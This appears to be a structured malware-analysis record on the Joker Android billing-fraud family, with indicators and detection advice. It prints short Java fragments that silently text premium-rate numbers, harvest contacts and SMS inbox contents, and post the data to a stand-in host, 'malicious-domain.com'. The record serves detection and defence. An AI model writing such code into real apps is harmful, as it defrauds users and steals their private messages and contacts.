package_info.package_versions: Unknown (latest variants as of report date)
package_info.why_malicious: The Joker malware is a premium billing fraud malware family distributed via malicious apps on Google Play. It covertly subscribes users to premium services, exfiltrates SMS and contact data, and employs advanced evasion techniques such as code obfuscation and dynamic loading to bypass detection mechanisms.

execution_context.file_location: malicious app code (e.g., MainActivity.java or background service)

malicious_snippets.code_snippet: SmsManager smsManager = SmsManager.getDefault(); smsManager.sendTextMessage(premiumNumber, null, message, null, null);
malicious_snippets.code_behavior: At runtime, the code uses the SmsManager API to automatically send SMS messages to premium-rate numbers without user interaction, resulting in unauthorized premium service subscriptions and direct financial loss for the victim.

malice_analysis.why_suspicious: Automated sending of SMS to premium-rate numbers without user consent is a well-known billing fraud technique used by malware to generate unauthorized charges.
malice_analysis.violated_expectations: Legitimate apps do not send SMS to premium-rate numbers without explicit user action and clear disclosure. Such actions should always require user initiation and visible confirmation.
malice_analysis.similar_legitimate_use: Some legitimate apps may send SMS for user-initiated actions like two-factor authentication, but always with explicit user consent and clear notification.
key_indicators: Automated SMS sending to premium-rate numbers
No user interaction or visible notification
Use of SmsManager API for background SMS transmission

execution_context.file_location: malicious app code (background service or broadcast receiver)

malicious_snippets.code_snippet: Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null); while (cursor.moveToNext()) { String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)); // ... collect and exfiltrate }
malicious_snippets.code_behavior: At runtime, the code queries the device's contact list using the ContentResolver API, collects contact names and details, and exfiltrates this data to a remote server controlled by the attacker, resulting in a privacy breach and enabling further social engineering attacks.

malice_analysis.why_suspicious: Harvesting and exfiltrating contact data without a clear user-facing purpose is a common tactic for both fraud and social engineering, as it enables attackers to target victims and their contacts.
malice_analysis.violated_expectations: Legitimate apps should only access contacts for transparent, user-requested features and must not transmit this data externally without explicit user consent.
malice_analysis.similar_legitimate_use: Messaging or social networking apps may access contacts to help users find friends, but only with user permission and without exfiltrating data to unknown servers.
key_indicators: Access to contacts without user-facing justification
Use of ContentResolver to enumerate contacts

execution_context.file_location: malicious app code (background service or broadcast receiver)

malicious_snippets.code_snippet: ContentResolver cr = getContentResolver(); Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), null, null, null, null); while (cursor.moveToNext()) { String body = cursor.getString(cursor.getColumnIndex("body")); // ... exfiltrate }
malicious_snippets.code_behavior: At runtime, the code accesses the device's SMS inbox using the ContentResolver API, reads incoming SMS messages (including OTPs and subscription confirmations), and exfiltrates their content to a remote server, enabling fraudulent subscription confirmation and bypassing user awareness.

malice_analysis.why_suspicious: Intercepting and exfiltrating SMS content, especially OTPs or subscription confirmations, is a hallmark of fraud and credential theft, allowing the malware to complete premium service subscriptions without user knowledge.
malice_analysis.violated_expectations: Normal apps should not access or transmit SMS content unless explicitly required for a user-facing feature and with clear disclosure and consent.
malice_analysis.similar_legitimate_use: SMS backup or messaging apps may access SMS with user consent, but should not exfiltrate messages to unknown or unauthorized servers.
key_indicators: Access to SMS inbox via ContentResolver
Exfiltration of SMS content to external server
Use in premium subscription fraud workflows

execution_context.file_location: malicious app code (obfuscated or dynamically loaded class)

malicious_snippets.code_snippet: String url = "http://malicious-domain.com/api"; HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection(); // ... send collected data
malicious_snippets.code_behavior: At runtime, the code establishes an HTTP connection to a hardcoded malicious domain using the HttpURLConnection API and transmits collected data (contacts, SMS, device info) to the attacker's server, enabling remote data theft and attacker control.

malice_analysis.why_suspicious: Hardcoded command-and-control (C2) domains and exfiltration of sensitive data are strong indicators of malware, especially when combined with obfuscated or dynamically loaded code to evade static analysis.
malice_analysis.violated_expectations: Legitimate apps should not communicate with unknown or suspicious domains, particularly to transmit sensitive user data such as contacts or SMS content.
malice_analysis.similar_legitimate_use: Apps may use network connections for legitimate APIs, but should not exfiltrate private data to untrusted or hardcoded domains.
key_indicators: Exfiltration of sensitive data (contacts, SMS, device info)
Obfuscated or dynamically loaded code for network operations

attack_chain.action: User installs a seemingly benign app from Google Play containing Joker malware.
Malicious code executes in the background, harvesting contacts and SMS data from the device.
attack_chain.leads_to: Data exfiltration and preparation for billing fraud

attack_chain.action: Malware sends SMS to premium-rate numbers to subscribe the victim to paid services without their knowledge.
Collected data (contacts, SMS, device info) is exfiltrated to attacker-controlled servers via hardcoded network connections.
attack_chain.leads_to: Attacker gains access to sensitive data and can further monetize or target victims

behavioral_signatures: Automated sending of SMS to premium-rate numbers without user interaction
Access and exfiltration of contacts and SMS data to external servers
Network connections to hardcoded or suspicious domains using obfuscated code
Use of dynamically loaded or obfuscated classes to perform sensitive operations
file_indicators: AndroidManifest.xml requesting SEND_SMS, READ_CONTACTS, READ_SMS, and INTERNET permissions
Presence of obfuscated classes or dynamically loaded code (e.g., use of DexClassLoader or reflection)
Unusual background services or broadcast receivers with no user-facing functionality
network_indicators: Outbound HTTP/HTTPS connections to known Joker C2 domains (e.g., hardcoded URLs in code)
POST requests containing contact or SMS data shortly after installation
Frequent, short-lived connections to external IPs/domains not associated with legitimate app functionality
detection_knowledge.how_to_detect: Monitor for apps requesting both SMS and contact permissions along with network access, especially if they send SMS to premium-rate numbers or exfiltrate data to unknown domains. Use behavioral analysis to detect automated SMS sending and background data exfiltration. Flag apps with obfuscated or dynamically loaded code that access sensitive data without clear user-facing features. Correlate network traffic to hardcoded or suspicious domains with app behaviors to identify malicious activity.
